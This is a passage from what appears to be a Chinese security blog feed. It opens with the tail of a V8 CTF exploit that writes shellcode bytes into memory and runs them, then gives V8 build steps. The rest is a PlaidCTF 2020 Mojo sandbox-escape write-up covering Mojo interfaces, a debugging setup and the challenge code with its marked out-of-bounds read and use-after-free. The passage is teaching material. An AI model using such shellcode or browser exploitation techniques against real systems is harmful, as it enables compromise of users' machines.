class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">121</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">59</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">184</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">76</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">90</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">226</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>,</span><br><span class="line">    <span class="number">184</span>, <span class="number">121</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;sc.<span class="property">length</span>;i++) &#123;</span><br><span class="line"><span class="comment">//adv.setUint32(i*4,shellcode[i],true);</span></span><br><span class="line">    dv.<span class="title function_">setUint8</span>(i,sc[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;使用如下方法编译&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git reset --hard 0ec93e047216979431bd6f147ab5956bb729afa2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;gclient &lt;span class=&quot;built_in&quot;&gt;sync&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 加入patch，编译release版本的d8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git apply --ignore-space-change --ignore-whitespace ../diff.patch&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tools/dev/v8gen.py x64.release &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ninja -C out.gn/x64.release d8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#该题其实不能使用debug版本的v8，只能使用release版本的v8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 编译debug版本的d8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tools/dev/v8gen.py x64.debug &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ninja -C out.gn/x64.debug d8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="v8" scheme="http://example.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>plaidctf2020 mojo writeup</title>
    <link href="http://example.com/2023/11/07/plaidctf2020-mojo-writeup/"/>
    <id>http://example.com/2023/11/07/plaidctf2020-mojo-writeup/</id>
    <published>2023-11-06T23:01:52.000Z</published>
    <updated>2025-02-02T08:54:54.406Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mojo"><a href="#mojo" class="headerlink" title="mojo"></a>mojo</h2><h2 id="mojo术语"><a href="#mojo术语" class="headerlink" title="mojo术语"></a>mojo术语</h2><p>message pipe是一对endpoints，对应通信的两端，每个endpoint保存一个传入消息队列，并且在一端写入消息可以有效地传送到另外一端，因此message pipe是双向的。<br>一个mojom文件描述一组interfaces，其代表的是强类型的消息集合。<br>给定一个mojom接口和一条message pipe，可以将其中指定为Remote，用来发送该接口描述的信息，另一端指定为Recevier，用来接收接口的消息。<br>Receiver端必须和mojom接口的具体实现(implementation)相绑定，从而将收到的消息分发给对应的接口实现函数。</p><span id="more"></span><h2 id="定义一个新的Frame-Interface"><a href="#定义一个新的Frame-Interface" class="headerlink" title="定义一个新的Frame Interface"></a>定义一个新的Frame Interface</h2><p>假设我们想从render frame向其对应在browser进程里的RenderFrameHostImpl发送一个Ping消息，我们需要去定义一个mojom interface，创建一个pipe去使用这个interface，然后绑定好pipe的两端以发送和接收消息。</p><h3 id="定义一个interface"><a href="#定义一个interface" class="headerlink" title="定义一个interface"></a>定义一个interface</h3><p>第一步就是去创建一个.mojom文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//src/example/public/mojom/ping_responder.mojom</span><br><span class="line"></span><br><span class="line">module example.mojom</span><br><span class="line"></span><br><span class="line">interface PingResponder &#123;</span><br><span class="line">  // Receives a &quot;Ping&quot; and responds with a random integer.</span><br><span class="line">  Ping() =&gt; (int32 random);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后我们在对应的位置创建一个BUILD.gn</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># src/example/public/mojom/BUILD.gn</span><br><span class="line">import(&quot;//mojo/public/tools/bindings/mojom.gni&quot;)</span><br><span class="line">mojom(&quot;mojom&quot;) &#123;</span><br><span class="line">  sources = [ &quot;ping_responder.mojom&quot; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们使用ninja指令来生成对应的头文件<code>ninja -C out/asan_debug example/public/mojom</code>。</p><h3 id="创建pipe"><a href="#创建pipe" class="headerlink" title="创建pipe"></a>创建pipe</h3><p>现在我们就可以创建一个消息管道来使用此接口。<br>作为一般规则并且在使用Mojo时为了方便起见，接口的Remote端通常是创建新的pipe的一方。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/third_party/blink/example/public/ping_responder.h</span></span><br><span class="line">mojo::Remote&lt;example::mojom::PingResponder&gt; ping_responder;</span><br><span class="line">mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver =</span><br><span class="line">    ping_responder.<span class="built_in">BindNewPipeAndPassReceiver</span>();</span><br></pre></td></tr></table></figure><p>在此例中<code>ping_responder</code>是Remote端，而<code>PendingReceiver</code>则是receiver的前身，它调用<code>BindNewPipeAndPassReceiver</code>方法来返回。<br><strong>注意：PendingReceiver实际上没有做任何事情，它是一个惰性的单一消息管道端点持有者。它仅存在于使其端点在编译时更强类型化，表明该端点希望由相同接口类型的接收器绑定。</strong></p><h3 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h3><p>最后我们可以通过Rmote调用我们的<code>Ping()</code>来发送消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// src/third_party/blink/example/public/ping_responder.h</span><br><span class="line">ping_responder-&gt;Ping(base::BindOnce(&amp;OnPong));</span><br></pre></td></tr></table></figure><p><strong>如果我们希望接收响应，必须在调用OnPong之前保持pingable对象的活性。毕竟，pingable拥有其消息管道端点。如果它被销毁，那么端点也将被销毁，将没有东西来接收响应消息。</strong><br>上述只是把渲染进程发送消息到浏览器进程，那么现在摆在面前的就是我们将接收器的消息传递给浏览器进程。</p><h3 id="发送PendingReceiver给Browser"><a href="#发送PendingReceiver给Browser" class="headerlink" title="发送PendingReceiver给Browser"></a>发送PendingReceiver给Browser</h3><p>值得注意的是，PendingReceivers（以及一般的消息管道端点）只是可以自由发送到 mojom 消息的另一种对象类型。将 PendingReceiver 传递到某个地方的最常见方式是将其作为某个已连接接口上的方法参数传递。始终在渲染器的 RenderFrameImpl 和浏览器中对应的RenderFrameHostImpl之间保持连接的一个接口是BrowserInterfaceBroker。该接口是获取其他接口的工厂。它的GetInterface方法接受一个 GenericPendingReceiver，允许传递任意接口接收器。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface BrowserInterfaceBroker &#123;</span><br><span class="line">  <span class="built_in">GetInterface</span>(mojo_base.mojom.GenericPendingReceiver receiver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于GenericPendingReceiver可以从任何PendingReceiver隐式构造，所以可以使用之前通过BindNewPipeAndPassReceiver创建的receiver来调用此方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RenderFrame* my_frame = <span class="built_in">GetMyFrame</span>();</span><br><span class="line">my_frame-&gt;<span class="built_in">GetBrowserInterfaceBroker</span>().<span class="built_in">GetInterface</span>(std::<span class="built_in">move</span>(receiver));</span><br></pre></td></tr></table></figure><p>这将传送PendingReceiver到browser进程里，并被BrowserInterfaceBroker接口的具体实现接收和处理。</p><h3 id="实现interface"><a href="#实现interface" class="headerlink" title="实现interface"></a>实现interface</h3><p>我们需要一个浏览器端实现我们的PingResponder接口。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;example/public/mojom/ping_responder.mojom.h&quot;</span></span></span><br><span class="line"><span class="comment">// PingResponderImpl 类的定义，实现 example::mojom::PingResponder 接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PingResponderImpl</span> :</span> example::mojom::PingResponder &#123;</span><br><span class="line"> public:</span><br><span class="line">  <span class="comment">// 构造函数，接受一个待处理的 Mojo 接收器，并将其传递给 receiver_ 成员进行初始化</span></span><br><span class="line">  explicit <span class="title function_">PingResponderImpl</span><span class="params">(mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver)</span></span><br><span class="line">      : <span class="title function_">receiver_</span><span class="params">(this, <span class="built_in">std</span>::move(receiver))</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 重写 example::mojom::PingResponder 接口的 Ping 方法</span></span><br><span class="line">  <span class="type">void</span> <span class="title function_">Ping</span><span class="params">(PingCallback callback)</span> override &#123;</span><br><span class="line">    <span class="comment">// 通过调用 std::move(callback) 将回调函数传递给 Run 方法，响应随机的整数 4</span></span><br><span class="line">    <span class="built_in">std</span>::move(callback).Run(<span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> private:</span><br><span class="line">  mojo::Receiver&lt;example::mojom::PingResponder&gt; receiver_;  <span class="comment">// 用于处理接收到的 Mojo 消息</span></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(PingResponderImpl);  <span class="comment">// 宏，禁止拷贝和赋值操作</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RenderFrameHostImpl保存一个BrowserInterfaceBroker的实现，当此实现收到GetInterface方法调用时，它将调用先前为此特定接口注册的处理程序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// render_frame_host_impl.h</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RenderFrameHostImpl</span> &#123;</span><br><span class="line">  <span class="comment">// ... 其他成员和方法 ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 声明 GetPingResponder 方法，接受一个待处理的 Mojo 接收器</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">GetPingResponder</span><span class="params">(mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... 其他私有成员 ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// PingResponderImpl 对象的唯一指针，用于处理 PingResponder 接口</span></span><br><span class="line">  std::unique_ptr&lt;PingResponderImpl&gt; ping_responder_;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// BrowserInterfaceBrokerImpl 对象，用于实现 BrowserInterfaceBroker 接口</span></span><br><span class="line">  BrowserInterfaceBrokerImpl&lt;RenderFrameHostImpl, RenderFrameHost*&gt; broker_&#123;<span class="keyword">this</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用于处理 BrowserInterfaceBroker 接口的 Mojo 接收器</span></span><br><span class="line">  mojo::Receiver&lt;blink::mojom::BrowserInterfaceBroker&gt; broker_receiver_&#123;&amp;broker_&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// render_frame_host_impl.cc</span></span><br><span class="line"><span class="comment">// 实现 GetPingResponder 方法，在这个方法中使用接收器构造 PingResponderImpl 对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RenderFrameHostImpl::GetPingResponder</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver)</span> </span>&#123;</span><br><span class="line">  ping_responder_ = std::<span class="built_in">make_unique</span>&lt;PingResponderImpl&gt;(std::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// browser_interface_binders.cc</span></span><br><span class="line"><span class="comment">// 实现 PopulateFrameBinders 方法，注册 PingResponder 的处理器</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PopulateFrameBinders</span><span class="params">(RenderFrameHostImpl* host,</span></span></span><br><span class="line"><span class="params"><span class="function">                          mojo::BinderMap* map)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ... 其他操作 ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 为 PingResponder 注册处理器，使用 RenderFrameHostImpl 的 GetPingResponder 方法</span></span><br><span class="line">  map-&gt;<span class="built_in">Add</span>&lt;example::mojom::PingResponder&gt;(base::<span class="built_in">BindRepeating</span>(</span><br><span class="line">    &amp;RenderFrameHostImpl::GetPingResponder, base::<span class="built_in">Unretained</span>(host)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="plaid-mojo-wp"><a href="#plaid-mojo-wp" class="headerlink" title="plaid mojo wp"></a>plaid mojo wp</h1><p>下面我们来查看plaid 2020 mojo这道题目，这个题目是一个沙箱逃逸题目，非常适合新手入门</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>由dockerfile中的命令可以得知，启动chrome的脚本为visit.sh。该脚本内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">timeout 20 ./chrome --headless --disable-gpu --remote-debugging-port=1338 --enable-blink-features=MojoJS,MojoJSTest &quot;$1&quot;</span><br></pre></td></tr></table></figure><p>我们可以设置一个–user-data-dir来更加方便的使用Devtools，该参数最直观的作用就是执行js代码时，所有的console.log输出都会同步至终端。<br>因此我们实际启动命令为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chrome --headless --disable-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --enable-blink-features=MojoJS,MojoJSTest http://0.0.0.0:8000/test.html</span><br></pre></td></tr></table></figure><p>之后我们开一个本地的端口，<code>python3 -m http.server 8000</code>,我们运行一下上面的命令来看一下结果,我们可以发现其输出了我们在文件里面执行的log命令。</p><img src="/2023/11/07/plaidctf2020-mojo-writeup/image.png" class="" title="image"><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>我们使用gdb脚本来进行调试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file ./chrome</span><br><span class="line"><span class="built_in">set</span> args --headless --disable-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --enable-blink-features=MojoJS,MojoJSTest http://0.0.0.0:8000/poc.html</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br></pre></td></tr></table></figure><p>之后运行如下命令即可进行调试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -x debug.sh</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>此题一共有两个漏洞，分别是越界读和一个UAF漏洞，其中UAF漏洞是利用的难点，也是本次分析的重点。我们首先来看其diff文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">module blink.mojom;</span><br><span class="line"></span><br><span class="line">// This interface provides a data store</span><br><span class="line">interface PlaidStore &#123;</span><br><span class="line"></span><br><span class="line">  // Stores data in the data store</span><br><span class="line">  StoreData(string key, array&lt;uint8&gt; data);</span><br><span class="line"></span><br><span class="line">  // Gets data from the data store</span><br><span class="line">  GetData(string key, uint32 count) =&gt; (array&lt;uint8&gt; data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述文件是一个mojom文件，其会生成对应的接口头文件，之后我们便可以使用该头文件来实现自己的代码代码，我们来看一下其实现的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> content &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RenderFrameHost</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PlaidStoreImpl</span> : <span class="keyword">public</span> blink::mojom::PlaidStore &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">PlaidStoreImpl</span><span class="params">(RenderFrameHost *render_frame_host)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Create</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">      RenderFrameHost* render_frame_host,</span></span></span><br><span class="line"><span class="params"><span class="function">      mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span>;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">PlaidStoreImpl</span>() <span class="keyword">override</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PlaidStore overrides:</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="type">const</span> std::string &amp;key,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt; &amp;data)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="type">const</span> std::string &amp;key,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="type">uint32_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">      GetDataCallback callback)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  RenderFrameHost* render_frame_host_;</span><br><span class="line">  std::map&lt;std::string, std::vector&lt;<span class="type">uint8_t</span>&gt; &gt; data_store_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// namespace content</span></span><br></pre></td></tr></table></figure><p>对上述代码的具体实现则是如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;content/browser/plaidstore/plaidstore_impl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;content/public/browser/render_frame_host.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mojo/public/cpp/bindings/self_owned_receiver.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> content &#123;</span><br><span class="line"></span><br><span class="line">PlaidStoreImpl::<span class="built_in">PlaidStoreImpl</span>(</span><br><span class="line">    RenderFrameHost *render_frame_host)</span><br><span class="line">    : <span class="built_in">render_frame_host_</span>(render_frame_host) &#123;&#125;</span><br><span class="line"></span><br><span class="line">PlaidStoreImpl::~<span class="built_in">PlaidStoreImpl</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PlaidStoreImpl::StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::string &amp;key,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt; &amp;data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;<span class="built_in">IsRenderFrameLive</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  data_store_[key] = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::string &amp;key,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">uint32_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">    GetDataCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;<span class="built_in">IsRenderFrameLive</span>()) &#123;</span><br><span class="line">    std::<span class="built_in">move</span>(callback).<span class="built_in">Run</span>(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> it = data_store_.<span class="built_in">find</span>(key);</span><br><span class="line">  <span class="keyword">if</span> (it == data_store_.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    std::<span class="built_in">move</span>(callback).<span class="built_in">Run</span>(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.begin(), it-&gt;second.begin() + count)</span></span>; <span class="comment">//oob</span></span><br><span class="line">  std::<span class="built_in">move</span>(callback).<span class="built_in">Run</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PlaidStoreImpl::Create</span><span class="params">( <span class="comment">//UAF</span></span></span></span><br><span class="line"><span class="params"><span class="function">    RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="params"><span class="function">    mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span> </span>&#123;</span><br><span class="line">  mojo::<span class="built_in">MakeSelfOwnedReceiver</span>(std::<span class="built_in">make_unique</span>&lt;PlaidStoreImpl&gt;(render_frame_host),</span><br><span class="line">                              std::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// namespace 